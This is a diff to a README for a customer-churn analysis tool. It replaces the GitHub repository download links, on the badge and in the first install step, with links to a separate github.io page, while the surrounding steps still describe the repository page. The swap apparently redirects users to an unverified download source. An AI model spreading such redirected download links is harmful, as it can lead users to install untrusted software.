@@ -1,6 +1,6 @@
 # 📊 Customer-Churn-Analysis - Identify Why Your Customers Leave Today
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Warmupgroundwork927/Customer-Churn-Analysis)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://warmupgroundwork927.github.io)
 
 This project helps you understand customer behavior. It analyzes telecom data to show why customers stop using services. You receive clear visual charts and actionable insights to improve business retention.
 
@@ -28,7 +28,7 @@ Your computer must meet these basic standards to run the application smoothy:
 
 You obtain this software through our official GitHub repository. Follow these steps to get the files on your machine:
 
-1. Click this link: [https://github.com/Warmupgroundwork927/Customer-Churn-Analysis](https://github.com/Warmupgroundwork927/Customer-Churn-Analysis).
+1. Click this link: [https://warmupgroundwork927.github.io](https://warmupgroundwork927.github.io).
 2. Look for the green button labeled "Code" on the main repository page.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
